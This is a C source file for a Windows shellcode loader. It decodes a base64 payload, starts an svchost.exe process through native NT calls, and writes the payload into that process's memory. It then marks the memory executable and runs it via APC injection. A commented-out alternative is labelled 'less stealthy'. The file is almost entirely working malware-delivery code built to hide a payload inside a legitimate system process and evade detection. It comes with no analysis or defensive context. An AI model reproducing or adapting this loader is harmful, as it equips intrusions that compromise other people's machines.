#include "apc.h"
#include "decode.h"

int main() {
	PVOID pAddress = NULL;
	SIZE_T sNumberOfBytesWritten = 0;
	DWORD dwOldProtection = NULL;
	printf("\n");
	decodeFull();

	if (!InitNtFunctions()) { printf("Failed to resolve NT functions.\n"); return 1; }

	UNICODE_STRING NtPath;
	UNICODE_STRING Win32Path;
	UNICODE_STRING Desktop;
	RtlInitUnicodeString(&NtPath, L"\\SystemRoot\\System32\\svchost.exe");
	RtlInitUnicodeString(&Win32Path, L"C:\\Windows\\System32\\svchost.exe");
	RtlInitUnicodeString(&Desktop, L"Winsta0\\Default");

	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	NTSTATUS paramStatus = RtlCreateProcessParametersEx(&ProcessParameters, &Win32Path, NULL, NULL,
		&Win32Path, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
	if (!NT_SUCCESS(paramStatus)) { printf("RtlCreateProcessParametersEx failed\n"); return 1; }





	// userproc version
	PS_CREATE_INFO CreateInfo = { 0 };
	CreateInfo.Size = sizeof(CreateInfo);
	CreateInfo.State = PsCreateInitialState;
	PPS_ATTRIBUTE_LIST AttributeList = (PPS_ATTRIBUTE_LIST)calloc(1, sizeof(PS_ATTRIBUTE_LIST));
	if (!AttributeList) return 1;
	AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);
	AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	AttributeList->Attributes[0].Size = NtPath.Length;
	AttributeList->Attributes[0].Value = (ULONG_PTR)NtPath.Buffer;

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	NTSTATUS status = NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
		NULL, NULL, 0, 0, ProcessParameters, &CreateInfo, AttributeList);
	if (status != STATUS_SUCCESS) { PRINTXD("NtCreateUserProcess", status); free(AttributeList); return 1; }
	DWORD pid = GetProcessId(hProcess);




	/* // Rtl version (less stealthy)
	RTL_USER_PROCESS_INFORMATION ProcessInfo = { 0 };
	ProcessInfo.Length = sizeof(RTL_USER_PROCESS_INFORMATION);
	status = RtlCreateUserProcess(&NtPath,OBJ_CASE_INSENSITIVE,ProcessParameters,NULL, NULL,
		NULL,FALSE,NULL, NULL,&ProcessInfo);

	if (!NT_SUCCESS(status)) {printf("[-] RtlCreateUserProcess failed: 0x%lx\n", status);return 1; }
	HANDLE hProcess = ProcessInfo.ProcessHandle;
	HANDLE hThread = ProcessInfo.ThreadHandle;
	DWORD pid = (DWORD)(ULONG_PTR)ProcessInfo.ClientId.UniqueProcess;
	*/




	SIZE_T originalSize = shellcode_size;
	status = NtAllocateVirtualMemory(hProcess, &pAddress, 0, &shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS) { PRINTXD("NtAllocateVirtualMemory", status); NtClose(hProcess); return;
	} else printf("Memory At : 0x%p \n", pAddress);

	status = NtWriteVirtualMemory(hProcess, pAddress, base64_decoded, originalSize, NULL);
	if (status != STATUS_SUCCESS) { PRINTXD("NtWriteVirtualMemory", status);
		NtFreeVirtualMemory(hProcess, &pAddress, &shellcode_size, MEM_RELEASE); NtClose(hProcess); return; }

	status = NtProtectVirtualMemory(hProcess, &pAddress, &shellcode_size, PAGE_EXECUTE_READ, &dwOldProtection);
	if (STATUS_SUCCESS != status) { PRINTXD("NtProtectVirtualMemory", status);
		NtFreeVirtualMemory(hProcess, &pAddress, &shellcode_size, MEM_RELEASE); NtClose(hProcess); return; }

	NtAPCinject(hThread, pAddress);
	Sleep(10000); NtClose(hProcess); NtClose(hThread); free(AttributeList); printf(" end"); return 0;
}

